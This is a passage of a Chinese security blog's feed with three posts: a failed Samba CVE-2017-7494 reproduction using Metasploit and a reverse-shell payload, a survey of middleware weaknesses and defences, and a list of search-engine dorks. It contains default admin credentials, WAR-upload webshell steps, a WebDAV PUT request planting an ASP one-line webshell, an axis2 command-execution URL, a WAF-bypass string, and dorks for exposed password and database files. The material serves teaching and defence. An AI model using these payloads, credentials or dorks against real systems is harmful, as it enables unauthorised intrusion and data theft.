class="variable">$BIN</span>/ruby <span class="variable">$FRAMEWORK</span>/<span class="variable">$cmd</span> <span class="variable">$db_args</span> <span class="string">"<span class="variable">$@</span>"</span></div></pre></td></tr></table></figure></p>
<p>　　本人第一次碰见这个报错，于是只能上google查找解决方案，翻查一会在Github的<a href="https://github.com/rapid7/metasploit-framework/issues/8302" target="_blank" rel="external">Issues</a>中发现了这个错误，错误原因是mac10.11版本不支持最新版的msf，需要将mac升级到10.12然后升级xcode。此时我的心情是崩溃的，首先我的是黑苹果，好不容易安装10.11成功了，想要突破到10.12谈何容易，其次msf已经被我升级了，怎么回退啊请问！</p>
<font color="#0593d3">注：其实不需要利用msfupdate更新msf，即使更新了也要自己加载exploit模块，因此只需要将is_known_pipename.rb文件放到msf的modules目录下即可。（当时sb了）</font>

<h4 id="Payload无法加载？"><a href="#Payload无法加载？" class="headerlink" title="Payload无法加载？"></a>Payload无法加载？</h4><p>　　舒缓心情后，继续折腾，那么既然mac上的msf不能用了，我就只能开一个虚拟机，好在之前虚拟机里面安装过kali，因此这回直接可以用了。打开kali后，我原本也想用msfupdate更新msf到最新版，但想想其实主要就是下载那个sabma漏洞的利用脚本。为了俭省时间，我直接去github上下载了is_known_pipename.rb，然后扔进了<em>/usr/share/metasploit-framework/modules/exploits/linux/samba/</em>目录下。然而当我运行msfconsole，加载is_known_pipename模块后，发现没有payload模块可以选择，因此攻击不能成功。</p>
<h4 id="Session回连失败"><a href="#Session回连失败" class="headerlink" title="Session回连失败"></a>Session回连失败</h4><p>　　事实证明当时是我打错了，应该不存在payload无法加载的问题。等我成功加载了此模块以及payload，也设置好参数了，可悲剧的事情又发生了，exploit实施攻击后，向靶机写入文件成功了，但是没有回链session。<br>MSF参数设置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> rhost 172.16.1.2 </div><div class="line"><span class="built_in">set</span> smb_share_base /home/nmask/share </div><div class="line"><span class="built_in">set</span> payload generic/shell_reverse_tcp</div><div class="line">exploit</div></pre></td></tr></table></figure></p>
<p>Exploit后回显的部分信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Exploit completed,but no session was created</div></pre></td></tr></table></figure></p>
<p>查看共享文件夹，已经成功生成.so文件：<br><img src="/upload_image/20170525/4.png" alt=""></p>
<h4 id="靶机网络问题or匿名登录问题？"><a href="#靶机网络问题or匿名登录问题？" class="headerlink" title="靶机网络问题or匿名登录问题？"></a>靶机网络问题or匿名登录问题？</h4><p>　　起初我以为是匿名登录的原因，于是设置了samba账号密码，并且在msf上也设置了SMBPass与SMBUser。</p>
<h5 id="靶机上配置"><a href="#靶机上配置" class="headerlink" title="靶机上配置"></a>靶机上配置</h5><p>修改配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[myshare]</div><div class="line">comment=smb share <span class="built_in">test</span></div><div class="line">browseable=yes <span class="comment">#可读</span></div><div class="line">writeable=yes <span class="comment">#可写</span></div><div class="line">path=/home/share  <span class="comment">#设置目录（上一步创建的共享目录）</span></div><div class="line">public = no <span class="comment">#不允许匿名登录</span></div></pre></td></tr></table></figure></p>
<p>在 [global] 设置选项中添加配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">security = user</div></pre></td></tr></table></figure></p>
<p>命令行添加用户<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">useradd smbuser</div><div class="line">smbpasswd -a smbuser</div><div class="line">/etc/init.d/restart</div></pre></td></tr></table></figure></p>
<p>注意以上添加的用户一定要是linux上存在的用户。</p>
<h5 id="kali上配置"><a href="#kali上配置" class="headerlink" title="kali上配置"></a>kali上配置</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> SMBUser username</div><div class="line"><span class="built_in">set</span> SMBPass password</div></pre></td></tr></table></figure>
<p>然而最终session仍然没有成功创建，然后我怀疑是靶机无法直接连接虚拟机监听的端口，于是用nc进行了测试。<br>虚拟机（kali）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -vv -l -p 4444</div></pre></td></tr></table></figure></p>
<p>靶机(Ubuntu 64位)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc 192.168.1.2 4444</div></pre></td></tr></table></figure></p>
<p>最后的结果证明，靶机可以连通虚拟机的4444端口。</p>
<h4 id="kali版本问题？"><a href="#kali版本问题？" class="headerlink" title="kali版本问题？"></a>kali版本问题？</h4><p>　　最后在逛tools时发现有表哥说此exp只适合64位的kali，虽然我不明白这跟kali的版本有毛关系，但事实是我的kali是32位的并且我没有复现成功。为了验证这一说法，我特意安装了64位的kali，然后将is_konwn_pipename.rb文件放到msf模块目录下，然而最终的结果还是没有成功，因此这个说法是不成立的。如果真的是对系统版本有要求，那也应该对靶机的环境有要求。</p>
<h4 id="也许搭了个假的靶机"><a href="#也许搭了个假的靶机" class="headerlink" title="也许搭了个假的靶机"></a>也许搭了个假的靶机</h4><p>　　那么我想最终原因就肯定出在我搭建的靶机上了，回顾过程，并没有发现有什么问题，而且权限也都是有的，毕竟共享文件夹下已经生成了.so文件。好吧，我暂时无能为力了，为了复现一个漏洞，我容易吗我!?</p>
<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ul>
<li>打补丁</li>
<li>升级到Samba 4.6.4/4.5.10/4.4.14任意版本</li>
<li>在smb.conf的[global]板块中添加参数：nt pipe support = no 然后重启smbd服务。</li>
</ul>
<h3 id="复现成功的案例"><a href="#复现成功的案例" class="headerlink" title="复现成功的案例"></a>复现成功的案例</h3><p><a href="http://mp.weixin.qq.com/s/qWFe3yBg6NUU_kyVRiAzeA" target="_blank" rel="external">http://mp.weixin.qq.com/s/qWFe3yBg6NUU_kyVRiAzeA</a>（复现了需要账号密码的情况）<br><a href="http://www.freebuf.com/vuls/135624.html" target="_blank" rel="external">http://www.freebuf.com/vuls/135624.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;我自横刀向天笑 去留肝胆两昆仑&lt;/blockquote&gt;&lt;br&gt;　　原本想复现一下CVE-2017-7494漏洞再分享出来的，没曾想过程一波三折，结果还铩羽而归。诶，还是在此记录一下失败的复现过程吧，为了纪念一下折腾不止的岁月，还有原谅我没有最终复现成功-！-。&lt;br&gt;
    
    </summary>
    
      <category term="系统安全" scheme="http://thief.one/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Samba漏洞" scheme="http://thief.one/tags/Samba%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="CVE-2017-7494" scheme="http://thief.one/tags/CVE-2017-7494/"/>
    
  </entry>
  
  <entry>
    <title>浅谈中间件漏洞与防护</title>
    <link href="http://thief.one/2017/05/25/1/"/>
    <id>http://thief.one/2017/05/25/1/</id>
    <published>2017-05-25T02:53:57.000Z</published>
    <updated>2017-07-25T12:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">博观而约取，厚积而薄发</blockquote><br>　　中间件漏洞可以说是最容易被web管理员忽视的漏洞，原因很简单，因为这并不是应用程序代码上存在的漏洞，而是属于一种应用部署环境的配置不当或者使用不当造成的。那么从实际情况来看，预防这种漏洞最大的难点，在于中间件安全该由谁负责？<br><a id="more"></a><br>　　我们在处理应急响应事件时经常遇到这么一种情况，客户网站代码是外包的，也就是第三方公司负责开发，而部署可能是由客户内部运维人员负责。暂不说他们对于中间件安全的重视程度与了解程度，只谈发现漏洞后如何处理，便是一团乱。开发商推卸说这并不是代码上的问题，他们完全是按照安全开发流程（SDL）走的，所以跟他无关；运维人员就一脸蒙蔽了，反驳道：你们当初没跟我说要配置什么啊，只是让我安装个程序就ok了，我怎么知道？<br>　　那么除此之外，开发人员以及运维人员对中间件安全意识的缺失也是一个重要因素，有些开发商可能会对自身代码进行安全检测，但只对代码部分进行审查是远远不够的。本篇用来记录总结一些常见的web中间件漏洞以及防护问题（记录的只是一部分，不代表全部），内容一部分摘自道哥的《白帽子讲web安全》一书，算做读书笔记亦或者读后感。</p>
<h3 id="中间件、容器、服务器傻傻分不清？"><a href="#中间件、容器、服务器傻傻分不清？" class="headerlink" title="中间件、容器、服务器傻傻分不清？"></a>中间件、容器、服务器傻傻分不清？</h3><p>　　在谈中间件安全问题时，我觉得有必要先梳理下以上几种关系以及概念。当初我在接触这些概念时，脑子里就是一团浆糊，中间件、容器、服务器、webserver等等概念感觉彼此很相似，但又有所区别。因此在书写本篇时，我特意翻查了一些资料，试图梳理清这几者之间的关系，参考了文章：<a href="http://www.voidcn.com/blog/saoraozhe3hao/article/p-2428756.html" target="_blank" rel="external">http://www.voidcn.com/blog/saoraozhe3hao/article/p-2428756.html</a></p>
<h4 id="基础概念与作用"><a href="#基础概念与作用" class="headerlink" title="基础概念与作用"></a>基础概念与作用</h4><p>这里只介绍web中间件、web服务器、web容器，因为除了web以外，其概念还可以扩展为数据库等。</p>
<h5 id="web服务器"><a href="#web服务器" class="headerlink" title="web服务器"></a>web服务器</h5><p>web服务器用于提供http服务，即向客户端返回信息，其可以处理HTTP协议，响应针对静态页面或图片的请求，控制页面跳转，或者把动态请求委托其它程序（中间件程序）等。</p>
<h5 id="web中间件"><a href="#web中间件" class="headerlink" title="web中间件"></a>web中间件</h5><p>web中间件用于提供系统软件和应用软件之间的连接，以便于软件各部件之间的沟通，其可以为一种或多种应用程序提供容器。</p>
<h5 id="web容器"><a href="#web容器" class="headerlink" title="web容器"></a>web容器</h5><p>web容器用于给处于其中的应用程序组件（JSP，SERVLET）提供一个环境，是中间件的一个组成部分，它实现了对动态语言的解析。比如tomcat可以解析jsp，是因为其内部有一个jsp容器。</p>
<h4 id="所属的类别"><a href="#所属的类别" class="headerlink" title="所属的类别"></a>所属的类别</h4><p>web服务器：IIS、Apache、nginx、tomcat、weblogic、websphere等。<br>web中间件：apache tomcat、BEA WebLogic、IBM WebSphere等。<br>web容器：JSP容器、SERVLET容器、ASP容器等。</p>
<p>注意：web中间件与web服务器是有重叠的，原因在于tomcat等web中间件也具备web服务器的功能。</p>
<h4 id="重点分析"><a href="#重点分析" class="headerlink" title="重点分析"></a>重点分析</h4><p>　　web服务器只是提供静态网页解析（如apache），或者提供跳转的这么一种服务。而web中间件（其包含web容器）可以解析动态语言，比如tomcat可以解析jsp（因为tomcat含有jsp容器），当然它也可以解析静态资源，因此它既是web中间件也是web服务器。不过tomcat解析静态资源的速度不如apache，因此常常两者结合使用。</p>
<h3 id="Tomcat漏洞与防护"><a href="#Tomcat漏洞与防护" class="headerlink" title="Tomcat漏洞与防护"></a>Tomcat漏洞与防护</h3><p>　　tomcat是apache的一个中间件软件，其可以提供jsp或者php的解析服务，为了方便远程管理与部署，安装完tomcat以后默认会有一个管理页面，管理员只需要远程上传一个WAR格式的文件，便可以将内容发布到网站，这一功能方便了管理员的同时也给黑客打开了方便之门，除此之外，tomcat还有一些样本页面，如果处理不当也会导致安全问题。</p>
<h4 id="tomcat远程部署漏洞详情"><a href="#tomcat远程部署漏洞详情" class="headerlink" title="tomcat远程部署漏洞详情"></a>tomcat远程部署漏洞详情</h4><p>tomcat管理地址通常是：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Http://localhost:8080/manager</div></pre></td></tr></table></figure></p>
<p>默认账号密码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">root/root</div><div class="line">tomcat/tomcat </div><div class="line">admin admin</div><div class="line">admin 123456</div></pre></td></tr></table></figure></p>
<h5 id="tomcat口令爆破"><a href="#tomcat口令爆破" class="headerlink" title="tomcat口令爆破"></a>tomcat口令爆破</h5><p>　　在默认不对tomcat做任何配置的时候爆破是无效的，而如果设置了账号密码就可以进行爆破。Tomcat的认证比较弱，Base64(用户名:密码)编码，请求响应码如果不是401（未经授权：访问由于凭据无效被拒绝。）即表示登录成功。登录成功后，可直接上传war文件，getshell（当然上传war文件需要manager权限）</p>
<h5 id="getshell过程"><a href="#getshell过程" class="headerlink" title="getshell过程"></a>getshell过程</h5><p>首先将我们的.jsp shell文件打包为war文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">jar -cvf shell.war shell.jsp</div></pre></td></tr></table></figure></p>
<p>登录管理页面后，选择上传war文件。<br><img src="/upload_image/20170525/1.png" alt=""><br>截图中间的目录便是上传成功以后的木马文件，可以点击浏览。<br><img src="/upload_image/20170525/2.png" alt=""><br>直接在当前目录下访问shell.jsp。</p>
<h4 id="Session-Example样本页面"><a href="#Session-Example样本页面" class="headerlink" title="Session Example样本页面"></a>Session Example样本页面</h4><p>默认地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/servlets-examples/servlet/SessionExample</div></pre></td></tr></table></figure></p>
<p>用来设置任意会话变量，恶意使用可对应用程序造成破坏。</p>
<h4 id="tomcat漏洞防护"><a href="#tomcat漏洞防护" class="headerlink" title="tomcat漏洞防护"></a>tomcat漏洞防护</h4><ul>
<li>升级tomcat版本</li>
<li>删除远程部署页面，或者限定页面的访问权限。</li>
<li>找到/conf/tomcat-users.xml修改用户名密码以及权限。</li>
<li>删除样例页面文件</li>
</ul>
<h3 id="JBoss漏洞与防护"><a href="#JBoss漏洞与防护" class="headerlink" title="JBoss漏洞与防护"></a>JBoss漏洞与防护</h3><p>JBoss这是一个基于JavaEE的应用服务器，与tomcat类似的是jboss也有远程部署平台，但不需要登陆。漏洞利用过程与tomcat类似，因此不再截图说明。除了远程部署漏洞外，jboss还存在反序列化漏洞，这里不再详述。</p>
<h4 id="JBoss远程部署漏洞详情"><a href="#JBoss远程部署漏洞详情" class="headerlink" title="JBoss远程部署漏洞详情"></a>JBoss远程部署漏洞详情</h4><p>默认管理后台地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:8080</div></pre></td></tr></table></figure></p>
<h4 id="getshell过程-1"><a href="#getshell过程-1" class="headerlink" title="getshell过程　　"></a>getshell过程　　</h4><p>　　访问管理页面，查看jboss配置页面中的JMX Console，这是JBoss的管理台程序，进入后找到Jboss.deployment包，该包下有flavor=URL.type=DeploymentSccanner选项。进入部署页面后便可以上传war文件，但与tomcat不同的是它不是本地上传war文件，而是从远程地址下载，因此需要自己准备一个文件服务器，用于远程下载war到目标jboss服务器上。具体方法是在部署页面找到”ADDURL”方法，输入URL地址，点击invoke。除了以上方法外，JMX-Console提供的BSH方法，同样也可以部署war包。</p>
<h4 id="JBoss漏洞防护"><a href="#JBoss漏洞防护" class="headerlink" title="JBoss漏洞防护"></a>JBoss漏洞防护</h4><ul>
<li>开启jmx-console密码认证</li>
<li>删除jmx-console.war与web-console.war</li>
</ul>
<h3 id="WebLogic漏洞与防护"><a href="#WebLogic漏洞与防护" class="headerlink" title="WebLogic漏洞与防护"></a>WebLogic漏洞与防护</h3><p>weblogic是一个基于JavaEE构架的中间件，安装完weblogic默认会监听7001端口。漏洞利用过程与tomcat类似，因此不再截图说明。</p>
<h4 id="Weblogic远程部署漏洞详情"><a href="#Weblogic远程部署漏洞详情" class="headerlink" title="Weblogic远程部署漏洞详情"></a>Weblogic远程部署漏洞详情</h4><p>默认后台地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:7001/console/login/loginForm.jsp</div></pre></td></tr></table></figure></p>
<p>账号密码：</p>
<ul>
<li>用户名密码均为：weblogic</li>
<li>用户名密码均为：system</li>
<li>用户名密码均为：portaladmin</li>
<li>用户名密码均为：guest</li>
</ul>
<h4 id="getshell过程-2"><a href="#getshell过程-2" class="headerlink" title="getshell过程"></a>getshell过程</h4><p>成功登陆weblogic后台后，找到部署按钮，点击后选择安装，然后可以选择本地上传war包也可以利用远程url下载，部署完成后，weblogic会给出文件地址。</p>
<h4 id="Weblogic漏洞防护"><a href="#Weblogic漏洞防护" class="headerlink" title="Weblogic漏洞防护"></a>Weblogic漏洞防护</h4><ul>
<li>删除远程部署页面</li>
</ul>
<h3 id="axis2漏洞与防护"><a href="#axis2漏洞与防护" class="headerlink" title="axis2漏洞与防护"></a>axis2漏洞与防护</h3><p>axis2也是apache的一个项目，是新一代的SOAP引擎，其存在一个任意命令执行漏洞。（该漏洞来自补天平台）</p>
<h4 id="axis2命令执行漏洞详情"><a href="#axis2命令执行漏洞详情" class="headerlink" title="axis2命令执行漏洞详情"></a>axis2命令执行漏洞详情</h4><p>默认后台地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/axis2-admin/</div></pre></td></tr></table></figure></p>
<p>默认账号密码：admin与axis2<br>登录后效果如下：<br><img src="/upload_image/20170525/3.png" alt=""><br>执行系统命令poc<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/services/Axis2Shell/execCmd?cmd=whoami</div></pre></td></tr></table></figure></p>
<h3 id="IIS漏洞与防护"><a href="#IIS漏洞与防护" class="headerlink" title="IIS漏洞与防护"></a>IIS漏洞与防护</h3><p>　　IIS是微软的一款web服务器，其配置不当容易产生webdav漏洞。webdav本身是iis的一项扩展功能，开启后可以使用除了get、post以外的一些请求类型，比如put等。但如果配置不当，就会导致文件上传漏洞。除了webdav漏洞，近期还爆出了一个远程命令执行漏洞，具体移步：<a href="http://thief.one/2017/03/29/IIS6-0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-7269/">IIS6.0远程命令执行漏洞(CVE-2017-7269)</a></p>
<h4 id="IIS-Webdav漏洞详情"><a href="#IIS-Webdav漏洞详情" class="headerlink" title="IIS Webdav漏洞详情"></a>IIS Webdav漏洞详情</h4><p>　　当测试一个站点是否存在webdav漏洞时，可以先构造一个OPTIONS请求，若返回200，则查看返回头的Allow参数中包含哪些方法（可以请求）。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">OPTIONS  / HTTP/1.1</div><div class="line">Host:thief.one</div></pre></td></tr></table></figure></p>
<p>如果存在PUT方法，则可以尝试写入一个txt文件。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">PUT /shell.txt HTTP/1.1</div><div class="line">HOST:thief.one</div><div class="line">Content-length:30</div><div class="line"></div><div class="line">&lt;%<span class="built_in">eval</span> request(<span class="string">"nmask"</span>)%&gt;</div></pre></td></tr></table></figure></p>
<p>　　若返回200则说明上传成功，此时可以手动访问此文件，确认是否存在。当然也有可能返回403，这表示此目录没有上传的权限，可以尝试上传到其他目录。<br>通过MOVE或COPY方法改文件后缀名。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">COPY /shell.txt HTTP/1.1</div><div class="line">HOST:thief.one</div><div class="line">Destination:http://thief.one/shell.asp</div></pre></td></tr></table></figure></p>
<h4 id="IIS漏洞防护"><a href="#IIS漏洞防护" class="headerlink" title="IIS漏洞防护"></a>IIS漏洞防护</h4><ul>
<li>关闭webdav功能</li>
</ul>
<h3 id="Apache漏洞与防护"><a href="#Apache漏洞与防护" class="headerlink" title="Apache漏洞与防护"></a>Apache漏洞与防护</h3><p>　　Apache本身也存在一些漏洞，比如slowhttp漏洞，当然官方认为其是apache的特性而不算是一种漏洞，然而事实证明它的危害真的很大。除了slowhttp漏洞以外，其第三方moudle存在很多反序列化或者远程命令执行的漏洞。</p>
<h4 id="Apache-slowhttp漏洞详情"><a href="#Apache-slowhttp漏洞详情" class="headerlink" title="Apache slowhttp漏洞详情"></a>Apache slowhttp漏洞详情</h4><p>关于slowhttp漏洞请移步：<a href="http://thief.one/2017/05/10/1/">浅谈DDOS攻击与防御</a></p>
<h3 id="HPP漏洞"><a href="#HPP漏洞" class="headerlink" title="HPP漏洞"></a>HPP漏洞</h3><p>HPP漏洞是web容器处理http参数时的问题，前面几款web服务器都或多或少存在这样的问题。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    <span class="variable">$str</span>=<span class="variable">$_REQUEST</span>[<span class="string">'str'</span>];                    <span class="comment">#$_REQUEST[]函数可以接受GET/POST。</span></div><div class="line">    Echo <span class="variable">$str</span>;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>比如访问URL:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.xxx.com/index.php?str=hello</div></pre></td></tr></table></figure></p>
<p>此时页面显示hello<br>但如果访问:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.xxx.com/index.php?str=hello&amp;str=world&amp;str=nmask</div></pre></td></tr></table></figure></p>
<p>此时页面显示nmask，把前面参数的值给覆盖了，这就是http参数污染。</p>
<h4 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h4><p>绕过WAF，如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PHP:index.php?str=1&amp;str=select * from admin --</div></pre></td></tr></table></figure></p>
<p>因为WAF可能会校验值的第一个单词，如果为select则触发，这样子可以避免被触发。</p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p>除了以上这些漏洞以外，web服务器还有着一些解析动态语言时存在的漏洞，移步：<a href="http://thief.one/2016/09/21/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">服务器解析漏洞 | nMask’Blog</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;博观而约取，厚积而薄发&lt;/blockquote&gt;&lt;br&gt;　　中间件漏洞可以说是最容易被web管理员忽视的漏洞，原因很简单，因为这并不是应用程序代码上存在的漏洞，而是属于一种应用部署环境的配置不当或者使用不当造成的。那么从实际情况来看，预防这种漏洞最大的难点，在于中间件安全该由谁负责？&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://thief.one/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="中间件漏洞" scheme="http://thief.one/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="中间件安全" scheme="http://thief.one/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>【渗透神器系列】搜索引擎</title>
    <link href="http://thief.one/2017/05/19/1/"/>
    <id>http://thief.one/2017/05/19/1/</id>
    <published>2017-05-19T03:23:05.000Z</published>
    <updated>2017-07-25T12:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">动动指尖，弹指一挥间</blockquote><br>　　搜索引擎是我日常工作中用得最多的一款工具，国内常用的搜索引擎包括Baidu，sougou，bing等。但我本篇要纪录的并不是这些常用的搜索引擎，而是信息安全从业人员必备的几款网络搜索引擎。本篇要介绍的搜索引擎包括：Shodan，censys，钟馗之眼，Google，FoFa，Dnsdb等。介绍的内容主要是这几款搜索引擎的一些高级语法，掌握高级语法会让搜索结果更准确。<br><a id="more"></a><br><em>对搜索引擎语法有所遗忘的，本文可当参考，仅此而已</em></p>
<h3 id="Google搜索引擎"><a href="#Google搜索引擎" class="headerlink" title="Google搜索引擎"></a>Google搜索引擎</h3><p>　　这里之所以要介绍google搜索引擎，是因为它有别于百度、搜狗等内容搜索引擎，其在安全界有着非同一般的地位，甚至专门有一名词为google hacking用来形容google与安全非同寻常的关系。</p>
<h4 id="google基本语法"><a href="#google基本语法" class="headerlink" title="google基本语法"></a>google基本语法</h4><p>Index of/　　使用它可以直接进入网站首页下的所有文件和文件夹中。<br>intext:　　将返回所有在网页正文部分包含关键词的网页。<br>intitle:　　将返回所有网页标题中包含关键词的网页。<br>cache:　　搜索google里关于某些内容的缓存。<br>define:　　搜索某个词语的定义。<br>filetype:　　搜索指定的文件类型，如：.bak，.mdb，.inc等。<br>info:　　查找指定站点的一些基本信息。<br>inurl:　　搜索我们指定的字符是否存在于URL中。<br>Link:　　link:thief.one可以返回所有和thief.one做了链接的URL。<br>site:　　site:thief.one将返回所有和这个站有关的URL。</p>
<p>+　　把google可能忽略的字列如查询范围。<br>-　　把某个字忽略，例子：新加 -坡。<br>~　　同意词。<br>.　　单一的通配符。<br>*　　通配符，可代表多个字母。<br>“”　　精确查询。</p>
<h4 id="搜索不同国家网站"><a href="#搜索不同国家网站" class="headerlink" title="搜索不同国家网站"></a>搜索不同国家网站</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">inurl:tw　　台湾</div><div class="line">inurl:jp　　日本</div></pre></td></tr></table></figure>
<h4 id="利用google暴库"><a href="#利用google暴库" class="headerlink" title="利用google暴库"></a>利用google暴库</h4><p>利用goole可以搜索到互联网上可以直接下载到的数据库文件，语法如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">inurl:editor/db/ </div><div class="line">inurl:eWebEditor/db/ </div><div class="line">inurl:bbs/data/ </div><div class="line">inurl:databackup/ </div><div class="line">inurl:blog/data/ </div><div class="line">inurl:\boke\data </div><div class="line">inurl:bbs/database/ </div><div class="line">inurl:conn.asp </div><div class="line">inc/conn.asp</div><div class="line">Server.mapPath(“.mdb”)</div><div class="line">allinurl:bbs data</div><div class="line">filetype:mdb inurl:database</div><div class="line">filetype:inc conn</div><div class="line">inurl:data filetype:mdb</div><div class="line">intitle:<span class="string">"index of"</span> data</div></pre></td></tr></table></figure></p>
<h4 id="利用goole搜索敏感信息"><a href="#利用goole搜索敏感信息" class="headerlink" title="利用goole搜索敏感信息"></a>利用goole搜索敏感信息</h4><p>利用google可以搜索一些网站的敏感信息，语法如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">intitle:<span class="string">"index of"</span> etc</div><div class="line">intitle:<span class="string">"Index of"</span> .sh_history</div><div class="line">intitle:<span class="string">"Index of"</span> .bash_history</div><div class="line">intitle:<span class="string">"index of"</span> passwd</div><div class="line">intitle:<span class="string">"index of"</span> people.lst</div><div class="line">intitle:<span class="string">"index of"</span> pwd.db</div><div class="line">intitle:<span class="string">"index of"</span> etc/shadow</div><div class="line">intitle:<span class="string">"index of"</span> spwd</div><div class="line">intitle:<span class="string">"index of"</span> master.passwd</div><div class="line">intitle:<span class="string">"index of"</span> htpasswd</div><div class="line">inurl:service.pwd</div></pre></td></tr></table></figure></p>
<h4 id="利用google搜索C段服务器信息"><a href="#利用google搜索C段服务器信息" class="headerlink" title="利用google搜索C段服务器信息"></a>利用google搜索C段服务器信息</h4><p>此技巧来自<a href="http://wolvez.club/" target="_blank" rel="external">lostwolf</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">site:218.87.21.*</div></pre></td></tr></table></figure></p>
<p>可通过google可获取218.87.21.0/24网络的服务信息。</p>
<h3 id="shodan搜索引擎"><a href="#shodan搜索引擎" class="headerlink" title="shodan搜索引擎"></a>shodan搜索引擎</h3><p>shodan网络搜索引擎偏向网络设备以及服务器的搜索，具体内容可上网查阅，这里给出它的高级搜索语法。<br>地址：<a href="https://www.shodan.io/" target="_blank" rel="external">https://www.shodan.io/</a></p>
<h4 id="搜索语法"><a href="#搜索语法" class="headerlink" title="搜索语法"></a>搜索语法</h4><ul>
<li>hostname：　　搜索指定的主机或域名，例如 hostname:”google”</li>
<li>port：　　搜索指定的端口或服务，例如 port:”21”</li>
<li>country：　　搜索指定的国家，例如 country:”CN”</li>
<li>city：　　搜索指定的城市，例如 city:”Hefei”</li>
<li>org：　　搜索指定的组织或公司，例如 org:”google”</li>
<li>isp：　　搜索指定的ISP供应商，例如 isp:”China Telecom”</li>
